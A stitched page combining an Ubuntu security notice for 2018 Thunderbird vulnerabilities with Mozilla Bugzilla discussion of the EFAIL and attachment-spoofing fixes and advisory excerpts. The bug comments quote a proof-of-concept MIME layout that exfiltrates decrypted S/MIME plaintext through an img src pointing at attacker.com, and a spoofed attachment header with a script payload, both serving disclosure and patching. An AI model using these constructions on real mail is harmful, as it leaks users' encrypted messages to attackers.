## Releases

* [Ubuntu 18.04 ESM](/security/notices?release=bionic)
* [Ubuntu 17.10](/security/notices?release=artful)
* [Ubuntu 16.04 ESM](/security/notices?release=xenial)
* [Ubuntu 14.04 ESM](/security/notices?release=trusty)

## Packages

* [thunderbird](/security/cves?package=thunderbird) - Mozilla Open Source mail and newsgroup client

## Details

Multiple security issues were discovered in Thunderbird. If a user were

tricked in to opening a specially crafted website in a browsing context,

an attacker could potentially exploit these to cause a denial of service

via application crash, install lightweight themes without user

interaction, or execute arbitrary code. ([CVE-2018-5150](/security/CVE-2018-5150), [CVE-2018-5154](/security/CVE-2018-5154),

[CVE-2018-5155](/security/CVE-2018-5155), [CVE-2018-5159](/security/CVE-2018-5159), [CVE-2018-5168](/security/CVE-2018-5168), [CVE-2018-5178](/security/CVE-2018-5178))

An issue was discovered when processing message headers in Thunderbird. If

a user were tricked in to opening a specially crafted message, an attacker

could potentially exploit this to cause a denial of service via

application hang. ([CVE-2018-5161](/security/CVE-2018-5161))

It was discovered encrypted messages could leak plaintext via the src

attribute of remote images or links. An attacker could potentially exploit

this to obtain sensitive information. ([CVE-2018-5162](/security/CVE-2018-5162))

It was discovered that the filename of an attachment could be spoofed. An

attacker could potentially exploit this by tricking the user in to opening

an attachment of a different type to the one expected. ([CVE-2018-5170](/security/CVE-2018-5170))

Multiple security issues were discovered in Skia. If a user were tricked

in to opening a specially crafted message, an attacker could potentially

exploit these to cause a denial of service via application crash, or

execute arbitrary code. ([CVE-2018-5183](/security/CVE-2018-5183))

It was discovered that S/MIME encrypted messages with remote content could

leak plaintext via a chosen-ciphertext attack. An attacker could

potentially exploit this to obtain sensitive information. ([CVE-2018-5184](/security/CVE-2018-5184))

It was discovered that plaintext of decrypted emails could leak by

submitting an embedded form. An attacker could potentially exploit this to

obtain sensitive information. ([CVE-2018-5185](/security/CVE-2018-5185))

This allows you to refer to bugs in other bug tracker installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with a comma. You should normally use this field to refer to bugs in other bug tracker installations, or bugs which are related to, but not known to be duplicates of the bug. Bugs which are regressions should be listed in the Regressed by field (above)Severity
This field describes the impact of a bug. This field is utilized by the programmers/engineers/release managers/managers to determine the severity of issues and used as input for the priority of the bug. It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

Summary
The bug summary is a short sentence which succinctly describes what the bug is about.Target Milestone
For Firefox-related bugs, when a change set (patch) lands in Mozilla-Central, the [sheriffs](/Sheriffing "Sheriffing") will set this field to the corresponding release value for the current Nightly.

As described in [bug 1419417 comment 1](/show_bug.cgi?id=1419417#c1 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"):
-------------------------------------------------------------
\*Proof of concept 3: Leaking plaintext through src attribute\*
-------------------------------------------------------------
Prerequisites:
- victim reads messages in HTML
- victim allows remote content (further attack variants possible, see below)
Attack:
Another variant of this attack is to use the HTML src attribute, for example, for invisible iframes or image tags to leak the plaintext:
multipart/mixed
|--- Content-Type: text/html
| <img src='<https://attacker.com/>
|--- Content-Type: multipart/encrypted
|--- Content-Type: application/pkcs7-mime
+--- Content-Type: text/html
'>

Should probably change bug number in the patch.
The attack only works with unclosed single quotes. So to make sure the attribute is ended, output internally a single quote (and a double one, just to make sure).

Attached file
[Encrypt test - Copy.eml](attachment.cgi?id=8972090)
— [Details](attachment.cgi?id=8972090&action=edit)

I created myself this test message where I took an encrypted messages that I can decrypt and wrapped it à la [attachment 8930486](/attachment.cgi?id=8930486 "Decryption oracle PoC 3: Leaking plaintext through src attribute") [[details]](/attachment.cgi?id=8930486&action=edit "Decryption oracle PoC 3: Leaking plaintext through src attribute").
When the message is displayed in the preview, I get this:
<div class="moz-text-html" lang="x-western"><img src="<http://localhost:8080/>
</div><BR><FIELDSET CLASS=&quot;mimeAttachmentHeader&quot;></FIELDSET><div class=&quot;moz-text-plain&quot; wrap=true graphical-quote=true style=&quot;font-family: -moz-fixed; font-size: 14px;&quot; lang=&quot;x-western&quot;><pre wrap class=&quot;moz-quote-pre&quot;>
Content-Type: application/pkcs7-mime; name=&quot;smime.p7m&quot;; smime-type=enveloped-data
Content-Transfer-Encoding: base64
MIAGCSqGSIb3DQEHA6CAMIACAQAxggNvMIIBogIBADCBiTB1MQswCQYDVQQGEwJJTDEWMBQG
[snip]
xfgpAAAAAAAAAAAAAA==
</pre></div><BR><FIELDSET CLASS=&quot;mimeAttachmentHeader&quot;></FIELDSET><div class=&quot;moz-text-html&quot; lang=&quot;x-western&quot;>" shrinktofit="true">
</div>
So the encrypted message makes it into the image src attribute and would be "phoned home". I haven't see that the decrypted text actually appears anywhere.
I'll try with the patch now to see what happens. Most likely, the src attribute will be terminated before the <BR><FIELDSET ...>.

[bug1419417](/show_bug.cgi?id=1419417 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails")\_efail\_src\_break.patch
With the patch the image I get is this:
<img src="<http://localhost:8080/>
</div><!--" "--="" shrinktofit="true">
Note that the DOM inspector converts single to double quotes.
I checked a few other messages and saw no bad side effects.
Sadly I cannot confirm the original attack vector, but this patch should fix the issue.

> Sadly I cannot confirm the original attack vector
Just re-tested (on 52.6.0) the original exploit ([attachment 8930486](/attachment.cgi?id=8930486 "Decryption oracle PoC 3: Leaking plaintext through src attribute") [[details]](/attachment.cgi?id=8930486&action=edit "Decryption oracle PoC 3: Leaking plaintext through src attribute")). If I click to allow remote content I get the following HTTP request containing the full plaintext of S/MIME and PGP/MIME encrypted messages.

> but this patch should fix the issue.
Yes, this should work (and can realistically be rolled out before public disclosure on 2018-05-15!). However, we need to bear in mind it's only a monkeypatch and there may be bypasses. E.g. if the HTML rendering engine evolves and one day decides to handle backticks as quotes we're screwed again. Same if an attacker finds a way to post HTML forms, use some nasty CSS bleeding tricks, etc. HTML just has so many options.
So, in the long term we should think of deeper fixes such as:
- Strict separation (separate DOM?) between different MIME message parts
- Do not decrypt S/MIME or PGP encrypted messages unless the encrypted part is the top-level part in the MIME tree (and has no other message parts as brothers)

This is a way too simple idea. It will fail for example for message forwarded as attachment.
There are several valid scenarios where decryption of non-toplevel MIME parts is desired.

From a security point of view, I'd generally dislike the idea of having partly encrypted (and partly signed) messages. It gives a false sense of security. Either its sig+enc or it's not :)
But I see that reality things are different and from a practical point of view we can probably not apply such more radical countermeasures :/

This allows you to refer to bugs in other bug tracker installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with a comma. You should normally use this field to refer to bugs in other bug tracker installations, or bugs which are related to, but not known to be duplicates of the bug. Bugs which are regressions should be listed in the Regressed by field (above)Severity
This field describes the impact of a bug. This field is utilized by the programmers/engineers/release managers/managers to determine the severity of issues and used as input for the priority of the bug. It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

Summary

| --- | --- |
| **defect** | regression, crash, hang, security vulnerability and any other general issue. |
| **enhancement** | new feature, improvement in UI, performance, etc. and any other request for user-facing changes and enhancements in the product; not engineering changes |
| **task** | refactoring, removal, replacement, enabling or disabling of functionality and any other engineering task |

URL
Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.Version
The version field defines the version of the software the bug was found in.Votes
Some bugs can be voted for, and you can limit your search to bugs with more than a certain number of votes. Votes are not used by Mozilla developers to set priorities.Whiteboard

Thunderbird implements external attachments via the X-Mozilla-External- Attachment-URL. The actual resource is specified via this header. It was discovered that the GUI displays the filename outlined in the “Content-Type” header, which is not related to the real resource. This can be abused to trick the user into opening an attachment, believing that this item is a safe resource like an image, HTML file or similar. Conversely, as illustrated next, Thunderbird would fetch a completely different file
--------------A320A96F6639F3C578F35383
Content-Type: message/external-body; access-type=whatever;
name="NameWhichIsShownInTheGui.html"
X-Mozilla-External-Attachment-URL: data:application/pdf,aaaaaaaaaaaaaaaaaaaaa
Content-Transfer-Encoding: 7bit
Content-Disposition: inline; filename="thisigui3.html"
Content-Transfer-Encoding: binary
Cure53, Berlin · 10/11/17
[Ghost Body1234]<h1>asdf</h1><script>alert(1)</script>
One solution to this problem would be to display a warning box to the user before fetching the external resource, making user clearly aware of the potential risks. Another approach could be to extract the filename via the X-Mozilla-External-Attachment-URL instead of the Content-Type header.
For the original report as PDF; see [bug 1411701](/show_bug.cgi?id=1411701 "RESOLVED FIXED").

[Bug 1411716](/show_bug.cgi?id=1411716 "RESOLVED FIXED - TBE-01-014: JavaScript Execution via RSS in mailbox:// origin") disallows the feed parser from creating X-Mozilla-External-Attachment-URI values that are not http\* (the only other use case for creating such a mimepart with that header is internal detachment of mail attachments, to file:// urls).
[Bug 1345167](/show_bug.cgi?id=1345167 "RESOLVED FIXED - Enhance UI display/feedback for external (deleted, detached to file, and http link) attachments") enables the url to be viewable in statusbar on mouseover, like any other protocol link.

For the record, it is completely legitimate to have a display name. This is no different from a web page text link where the text could be some spoofy wording to evilsite.com url. Since only http links are accepted now, a click will open the url in a default browser whose infrastructure for handling malicious sites takes over.
The enhancement needed is to enable the user to at least see the url link, like in Fx, as per [comment 1](/show_bug.cgi?id=1411732#c1 "RESOLVED FIXED - TBE-01-009: Filename Spoofing for external Attachments").Status: REOPENED → RESOLVEDClosed: 7 years ago → 7 years agoResolution: --- → DUPLICATE

Note this specific bug will be a non-issue with the patch in [bug 1411748](/show_bug.cgi?id=1411748 "RESOLVED FIXED - TBE-01-007: \"Reload Page\" dialog runs Javascript with external attachment because we only disable JavaScript for nsIMsgMessageUrls"). The better solution is likely [bug 1345167](/show_bug.cgi?id=1345167 "RESOLVED FIXED - Enhance UI display/feedback for external (deleted, detached to file, and http link) attachments"), but the former is less risky to uplift.

http links are being disabled for the time being until we can fix [bug 1345167](/show_bug.cgi?id=1345167 "RESOLVED FIXED - Enhance UI display/feedback for external (deleted, detached to file, and http link) attachments"). With that, the risk is pretty low for this bug and the testcase above would not work.
What would still work is an external file: url, I have a patch that prefers the leafName of the file in that case which is low risk and easy to uplift.Status: RESOLVED → REOPENEDResolution: DUPLICATE → ---

not sure I get what this is about.
what's the ?:\/ matching?

?: means it shouldn't be a capture group. The intent is to get the stuff after the last slash. Come to think of it, this might have to be a bit more complicated to catch possible query refs, hashmarks, etc. Right now this won't be exposed since I removed external urls in the other patch, so this is somewhat untested.

Thought some more on this, and I'm coming back to [comment 3](/show_bug.cgi?id=1411732#c3 "RESOLVED FIXED - TBE-01-009: Filename Spoofing for external Attachments").
I don't really see the (solvable) problem here. It doesn't really matter what filename is displayed, since nothing prevents the evil site from redirecting to something else in the end. Not much we can do to prevent that, it's all just a try at social engineering.
The same solution that's proposed for [bug 1411748](/show_bug.cgi?id=1411748 "RESOLVED FIXED - TBE-01-007: \"Reload Page\" dialog runs Javascript with external attachment because we only disable JavaScript for nsIMsgMessageUrls") would mitigate it - always launch the browser for external http attachments.
Or is there something I'm not seeing here? Opinions?

I think we should take this fix as a mitigation short term, then we can consider other options like [bug 1411748](/show_bug.cgi?id=1411748 "RESOLVED FIXED - TBE-01-007: \"Reload Page\" dialog runs Javascript with external attachment because we only disable JavaScript for nsIMsgMessageUrls") going forward.Flags: needinfo?(philipp)

Like I wrote in [comment 9](/show_bug.cgi?id=1411732#c9 "RESOLVED FIXED - TBE-01-009: Filename Spoofing for external Attachments"), I don't see what this is fixing, so minusing for now.

As per [comment #3](/show_bug.cgi?id=1411732#c3 "RESOLVED FIXED - TBE-01-009: Filename Spoofing for external Attachments"), this would be fixed by [bug 1345167](/show_bug.cgi?id=1345167 "RESOLVED FIXED - Enhance UI display/feedback for external (deleted, detached to file, and http link) attachments") since the spoof would be mitigated when the url is revealed/visible.

Yes, the most important thing to communicate is that it's not a local attachment. We can't know anything about the real content that url is going to lead to.

In the case there are any remote external attachments in mails, make the name of the attachment be of the format "URL - name". Don't do it for feeds, where it's used for enclosures, but those are always remote.

I'm quite confused by this. You used an attachment of [bug 1342838](/show_bug.cgi?id=1342838 "RESOLVED FIXED - MIME emitter needs to use asciispec for external link urls for IDN domains") as an example here.
Where is the modified name
this.name = url + " - " + this.name;
displayed in the UI? I see no difference with the patch. Despite having four attachments, one "inline", the attachment area claims to have three. I see the original filenames displayed:
externalbody-attachment.html
thisigui3.html
LA-MAR\_Cebiche-Clássico\_foto-Henrique-Peron-470x120-1371827671.jpg
OK, if I switch "Display Attachment Inline" off, I get four attachments.
When I double-click thisigui3.html, it tries to open <http://example.com/abc.doc> in the preview pane.

Yeah, that just happened to be handy.
You should see the modified format for all the attachments. In the attachments area, once you click open the "3 attachments". Are you sure you had the patch successfully applied? At least it works for me.

Looks like the message is treated as feed message in a local folder. The behaviour changes when you remove 0x40 (FeedMsg) from the X-Mozilla-Status.

#### [#CVE-2018-5174: Windows Defender SmartScreen UI runs with less secure behavior for downloaded files in Windows 10 April 2018 Update](#CVE-2018-5174)

Reporter
Jimmy
Impact
moderate
##### Description

In the Windows 10 April 2018 Update, Windows Defender SmartScreen honors the `SEE_MASK_FLAG_NO_UI` flag associated with downloaded files and will not show any UI. Files that are unknown and potentially dangerous will be allowed to run because SmartScreen will not prompt the user for a decision, and if the user is offline all files will be allowed to be opened because Windows won’t prompt the user to ask what to do. Firefox incorrectly sets this flag when downloading files, leading to less secure behavior from SmartScreen.
*Note: this issue only affects Windows 10 users running the April 2018 update or later. It does not affect other Windows users or other operating systems.*

Reporter
Mozilla developers and community
Impact
critical
##### Description

Mozilla developers and community members Christoph Diehl, Randell Jesup, Tyson Smith, Alex Gaynor, Ronald Crane, Julian Hector, Kannan Vijayan, and Jason Kratzer reported memory safety bugs present in Firefox 59, Firefox ESR 52.7, and Thunderbird 52.7. Some of these bugs showed evidence of memory corruption and we presume that with enough effort that some of these could be exploited to run arbitrary code.
